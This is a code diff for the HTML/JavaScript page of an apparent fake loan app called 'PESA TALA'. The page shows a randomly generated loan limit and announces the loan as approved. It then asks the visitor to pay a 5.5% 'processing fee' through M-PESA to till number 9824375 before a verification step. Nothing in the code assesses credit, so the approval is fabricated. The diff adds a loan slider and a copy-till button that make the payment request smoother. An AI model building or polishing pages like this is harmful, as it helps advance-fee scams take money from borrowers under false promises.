@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Loan Limit - PESA TALA</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
@@ -13,38 +13,44 @@
     <h2 class="text-xl font-bold mb-2">Your Loan Limit</h2>
 
     <p class="text-gray-800 mb-2">Hi <span class="font-semibold" id="displayName">User</span>,</p>
-    <h1 class="text-3xl font-bold text-purple-700 mb-4" id="loanDisplay">Ksh ...</h1>
+    
+    <div class="mb-4">
+      <h1 class="text-2xl font-bold text-purple-700" id="loanDisplay">Ksh ...</h1>
+      <input type="range" min="1000" max="4500" step="100" id="loanSlider"
+        class="w-full accent-purple-700 mt-4" onchange="updateLoan(this.value)">
+      <p class="text-xs text-gray-600 mt-1">Adjust your loan below the maximum limit</p>
+    </div>
 
-    <p class="text-sm text-gray-700 mb-2">Processing Fee: <span class="font-semibold text-purple-700" id="processingFee">Ksh ...</span></p>
+    <p class="text-sm text-gray-700 mb-2">
+      Processing Fee: <span class="font-semibold text-purple-700" id="processingFee">Ksh ...</span>
+    </p>
 
-    <button onclick="showCongrats()" class="w-full bg-purple-700 hover:bg-purple-800 text-white py-3 rounded-xl mt-4 transition">
+    <button onclick="showFinalPopup()" class="w-full bg-purple-700 hover:bg-purple-800 text-white py-3 rounded-xl mt-4 transition">
       Continue
     </button>
   </div>
 
-  <!-- 🎉 First Popup: Congratulations -->
-  <div id="congratsOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-    <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
-      <h2 class="text-2xl font-bold mb-2">🎉 Congratulations!</h2>
-      <p class="text-sm mb-3">Your loan of <span class="font-bold text-purple-700" id="congratsLoan">Ksh ...</span> has been approved.</p>
-      <p class="text-sm mb-2">Processing Fee: <span class="font-bold text-purple-700" id="congratsFee">Ksh ...</span></p>
-      <p class="text-sm mb-4">Repayment Period: <span class="font-semibold">14 Days</span></p>
-
-      <button onclick="showPaymentPopup()" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
-        Proceed
-      </button>
-    </div>
-  </div>
-
-  <!-- 💳 Second Popup: Payment Details -->
+  <!-- Final Combined Popup -->
   <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
     <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
-      <h2 class="text-xl font-bold mb-2">Hi, <span id="userName">User</span></h2>
-      <p class="text-sm mb-4">
-        To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment of
-        <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span> for your approved loan of
-        <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> to your <strong>PESA TALA</strong> account below.
-      </p>
+      <h2 class="text-2xl font-bold mb-2">🎉 Congratulations, <span id="popupName">User</span>!</h2>
+      <p class="text-sm mb-3">Your loan of <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> has been approved.</p>
+      <p class="text-sm mb-2">Processing Fee: <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span></p>
+      <p class="text-sm mb-4">Repayment Period: <strong>14 Days</strong></p>
+
+      <div class="text-left text-sm mb-4 bg-gray-100 p-3 rounded-xl shadow-sm">
+        <p class="font-semibold mb-2">To complete your application:</p>
+        <ul class="list-disc list-inside text-gray-700 space-y-1">
+          <li>Go to M-PESA: <strong>M-PESA</strong></li>
+          <li>Lipa na M-PESA: <strong>Buy Goods and Services</strong></li>
+          <li>Enter Till Number: <strong id="till">9824375</strong> 
+            <button onclick="copyTill()" class="text-xs text-blue-500 underline ml-1">Click to copy</button>
+          </li>
+          <li>Enter Amount: <strong id="popupFee2">Ksh ...</strong></li>
+          <li>Enter your M-PESA PIN and complete the payment</li>
+        </ul>
+      </div>
+
       <button onclick="goToVerification()" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
         Proceed to Payment
       </button>
@@ -52,39 +58,60 @@
   </div>
 
   <script>
+    // Fetch name
     const fullName = localStorage.getItem("fullName") || "User";
     const shortName = fullName.split(" ")[0];
-
-    const loanLimit = Math.floor(Math.random() * (4500 - 1800 + 1)) + 1800;
-    const processingFee = Math.round(loanLimit * 0.055);
-
-    // Save for use in verification.html
-    localStorage.setItem("loanAmount", loanLimit);
-    localStorage.setItem("processingFee", processingFee);
-
-    // Display on page
     document.getElementById("displayName").textContent = shortName;
-    document.getElementById("loanDisplay").textContent = `Ksh ${loanLimit.toLocaleString()}`;
+
+    // Generate loan limit and set slider
+    const loanLimit = Math.floor(Math.random() * (4500 - 1800 + 1)) + 1800;
+    let selectedLoan = loanLimit;
+    let processingFee = calcFee(selectedLoan);
+
+    document.getElementById("loanSlider").max = loanLimit;
+    document.getElementById("loanSlider").value = selectedLoan;
+    document.getElementById("loanDisplay").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
     document.getElementById("processingFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
 
-    function showCongrats() {
-      document.getElementById("congratsLoan").textContent = `Ksh ${loanLimit.toLocaleString()}`;
-      document.getElementById("congratsFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
-      document.getElementById("congratsOverlay").classList.remove("hidden");
+    // Store initial loan values
+    localStorage.setItem("loanAmount", selectedLoan);
+    localStorage.setItem("processingFee", processingFee);
+
+    function calcFee(amount) {
+      return Math.round(amount * 0.055);
     }
 
-    function showPaymentPopup() {
-      document.getElementById("userName").textContent = shortName;
-      document.getElementById("popupLoan").textContent = `Ksh ${loanLimit.toLocaleString()}`;
-      document.getElementById("popupFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
-      document.getElementById("congratsOverlay").classList.add("hidden");
+    function updateLoan(val) {
+      selectedLoan = parseInt(val);
+      processingFee = calcFee(selectedLoan);
+
+      document.getElementById("loanDisplay").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
+      document.getElementById("processingFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
+
+      // Store new values
+      localStorage.setItem("loanAmount", selectedLoan);
+      localStorage.setItem("processingFee", processingFee);
+    }
+
+    function showFinalPopup() {
       document.getElementById("popupOverlay").classList.remove("hidden");
+
+      document.getElementById("popupName").textContent = shortName;
+      document.getElementById("popupLoan").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
+      document.getElementById("popupFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
+      document.getElementById("popupFee2").textContent = `Ksh ${processingFee.toLocaleString()}`;
     }
 
     function goToVerification() {
       window.location.href = "verification.html";
     }
-  </script>
 
+    function copyTill() {
+      const till = document.getElementById("till").innerText;
+      navigator.clipboard.writeText(till).then(() => {
+        alert("Till number copied: " + till);
+      });
+    }
+  </script>
 </body>
 </html>
